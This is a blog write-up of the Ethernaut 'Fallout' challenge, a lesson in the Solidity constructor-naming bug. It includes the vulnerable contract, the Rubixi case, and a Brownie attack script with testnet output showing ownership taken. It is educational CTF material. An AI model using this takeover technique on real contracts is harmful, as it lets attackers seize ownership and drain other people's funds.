---
title: Ethernaut - Level 02 - Fallout
date: 2022-08-02
---
{{<figure src="../images/fallout-2.svg" caption="Image courtesy of OpenZeppelin">}}
## Ethernaut 02 - Fallout
The goal for this level is to claim ownership of the contract, which has the following implementation: 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```
Contrarily to the previous level, this one is really simple and will teach us about constructors and the `public` modifier in Solidity.

Ethernaut challenges recreate issues that may no longer exist in recent versions of Solidity, but still are a good exercise on how to securely code smart contracts.

Up to Solidity 0.4.21, constructors could be defined using the same name of its contract name, although this could cause unintended bugs when contracts were renamed and their constructors were not.

Precisely to avoid this behavior Solidity introduced the `constructor` keyword. Which according to Solidity's documentation, constructors are caracterized for:

- Being optional functions which are executed upon contract creation, and can be used to run contract initialisation code
- Before the constructor code is executed, state variables are initialised to their specified value (inline), or their default value.
- If there is no constructor, the contract will assume thhe default constructor, equivalent to `constructor() {}`.

Additionally, Solidity has four types of visibility for functions:

- **external** -- Part of the contract interface, and therefore can be called from other contracts and via transactions, with the unusual characteristic that external functions **cannot be called internally**.
- **public** -- Also part of the contract interface, **can be called internally** or via message calls
- **internal** -- Can only be accessed from within the current contract or contracts deriving from it. They cannot be accessed externally.
- **private** -- Functions are not visible in derived contracts.

Understanding these concepts will help us complete this challenge.

## Where is the vulnerability?
One particular thing that should get our attention is the contract's name, and the comment before the `Fal1out` method declaration:


```solidity {lineos=table,hl_lines=[1,7,8],lineofstart=1}
contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

As mentioned before, Solidity versions prior 0.5.0, required a constructor to be called with the same name as the contract, however, the security issue with this contract is that there is a typo and the function that should act as constructor has been named `Fal1out`, rather than `Fallout`, and uses the `public` attribute, meaning, it can be called by anyone.

If we review its code, whoever calls the `Fal1out` method will become its legitimate owner and therefore will be able to drain its funds.

```solidity {lineos=table,hl_lines=[1],lineofstart=1}
    owner = msg.sender;
    allocations[owner] = msg.value;
```

This vulnerability is rare to occur in recent versions of Solidity, since contracts are now forced to use the `constructor` keyword.

 Something as simple as this is what happened with the Rubixi incidence, where the developer renamed the contract’s name from `DynamicPyramid` to `Rubixi`, but forgot to rename the constructor function from `DynamicPyramid()` to `Rubixi()` and as result attackers could publicly invoke the `DynamicPyramic()` function and obtain control of the contract, transferring its ethers out.

```solidity {lineos=table,hl_lines=[1,13,14],lineofstart=1}
contract Rubixi {

        //Declare variables for storage critical to contract
        uint private balance = 0;
        uint private collectedFees = 0;
        uint private feePercent = 10;
        uint private pyramidMultiplier = 300;
        uint private payoutOrder = 0;

        address private creator;

        //Sets creator
        function DynamicPyramid() {
                creator = msg.sender;
        }
...omitted for brevity...
```

**See the similarities?** Now let's explain how to exploit this contract!


## Hacking the contract
Following our steps from previous level, we will continue using brownie for the exploitation of this contract.

For this particular level we will create a simple interface which require access to the `owner()` and `Fal1out()` function, as shown below:

```solidity {lineos=table,hl_lines=[5,6],lineofstart=1}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IFallout {
    function owner() external view returns (address payable);
    function Fal1out() external payable;
}
```

Our script to attack the contract and drain all the Ethers will be pretty straightforward:

```python {lineos=table,hl_lines=[5],lineofstart=1}
from brownie import accounts, config, interface, web3, Fallout

def attack(target, hacker):
    fallout = interface.IFallout(target)
    fallout.Fal1out({"from": hacker})
    print(f"Owner is hacker: {fallout.owner() == hacker}")


def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack(target, hacker)
```

In this case we have a `main` function which receives as parameter the contract’s address that we are aiming to attack, and the `attack` method, which receives the `target` and `hacker` parameters. This method is the one that will claim ownership of the contract right after calling its constructor through the `fallout.Fal1out` call, as shown below:

```bash
root@vmi828562 ~/r/e/fallout-02 [1]# brownie run attack main "0xD48037e289Be89083bE8e58dFC74bd578D6523e3" --network rinkeby
Brownie v1.18.1 - Python development framework for Ethereum

Fallout02Project is the active project.

Running 'scripts/attack.py::main'...
Transaction sent: 0x11be0d3bac8cc87cfa19b8bf03a4ecc7760b441d6ab6d0b5e801a0f436ea9300
  Gas price: 1.16223081 gwei   Gas limit: 50442   Nonce: 21
  Transaction confirmed   Block: 10722650   Gas used: 45767 (90.73%)

Owner is hacker: True
```

## Takeaways
As usual, we like to wrap up each challenge with some recommendations or lessons learnt. In this case I think the most valuable lesson is to learn about what constructors are and how they should be declared.

But it is also a good opportunity to introduce [security analysis tools](https://consensys.net/diligence/tools/) that can help us discover vulnerabilities in our Ethereum smart contract code during its development life cycle.